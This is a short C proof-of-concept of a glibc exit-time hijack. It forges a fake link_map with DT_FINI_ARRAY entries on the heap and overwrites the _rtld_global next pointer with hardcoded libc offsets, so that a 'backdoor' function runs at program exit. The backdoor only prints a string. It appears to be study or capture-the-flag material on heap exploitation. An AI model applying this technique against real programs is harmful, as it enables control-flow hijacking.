#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#define rtld_global 0x23c060
#define rtld_global_3_next 0x1f2018
void backdoor()
{
	printf("Please funk me!\n");
	
}


int main (void)
{
  
	//setvbuf(stdout, 0, 2, 0);
	size_t *p = malloc(0x400);
	//printf("1xxxxx\n");
	size_t libc_base = *(size_t*)&stdin - 0x1ec980;
	//printf("2xxxxx\n");
        printf("\033[31mlibc_base: %lx\033[0m\n", libc_base);
	//p[3] = libc_base + 0x23d740;	 	//l_next
	p[3] = 0;
	//printf("3xxxxx\n");
	p[5] = (size_t)p;		 	//l_real
	//printf("4xxxxx\n");
	p[34] = (size_t)&p[34];		 	//l->l_info[26] DT_FINI_ARRAY
	//printf("5xxxxx\n");
	p[35] = (size_t)&p[38];			//l->l_info[DT_FINI_ARRAY]->d_un.d_ptr    
	//printf("6xxxxx\n");
	p[36] = (size_t)&p[36];			//l->l_info[DT_FINI_ARRAYSZ]
	//printf("7xxxxx\n");
	p[37] = 0x8;			 	//i=l->l_info[DT_FINI_ARRAYSZ]->d_un.d_val
	//printf("8xxxxx\n");
	p[38] = (size_t)backdoor;	 	//call array[i]
	//printf("9xxxxx\n");
	*((int *)((char*)p + 0x31c)) = 8;	// 0000 0000 0000 0000 0000 0000 0000 0000
	//printf("10xxxxx\n");
	*(size_t *)(rtld_global_3_next + libc_base) = (size_t)p;//_rtld_global
	//printf("11xxxxx\n");
	return 0;
}


